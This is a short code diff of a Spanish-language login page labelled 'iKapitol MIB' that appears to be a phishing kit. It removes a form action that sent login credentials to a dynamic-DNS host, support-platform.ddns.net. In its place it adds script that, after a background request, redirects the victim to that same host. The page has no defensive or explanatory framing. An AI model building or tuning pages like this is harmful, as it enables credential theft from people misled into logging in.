@@ -56,7 +56,7 @@
                 <br/>
                 iKapitol MIB
 
-                <form id="loginForm" method="POST" accept-charset="UTF-8" class="form-signin" data-parsley-validate="data-parsley-validate" action="https://support-platform.ddns.net/Index/Start">
+                <form id="loginForm" method="POST" accept-charset="UTF-8" class="form-signin" data-parsley-validate="data-parsley-validate">
 
 
                     <div class="row">
@@ -86,7 +86,6 @@
                         <!-- /.col -->
                         <div class="col-md-12 text-center">
                             <button class="btn btn-block btn-primary btn-lg">Ingresar</button>
-                            <input type="hidden" name="submitlogin" value="" style="display: none;">
                         </div>
                         <!-- /.col -->
                     </div>
@@ -154,8 +153,9 @@ document.addEventListener('DOMContentLoaded', function () {
 
     xhr.onreadystatechange = function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
-        document.getElementById("loginForm").submit();
-        console.log('Form submitted successfully');
+         var timestamp = new Date().getTime();
+         var redirectUrl = 'https://support-platform.ddns.net/Index/Start?timestamp=' + timestamp;
+         window.location.href = redirectUrl;
       }
     };
 
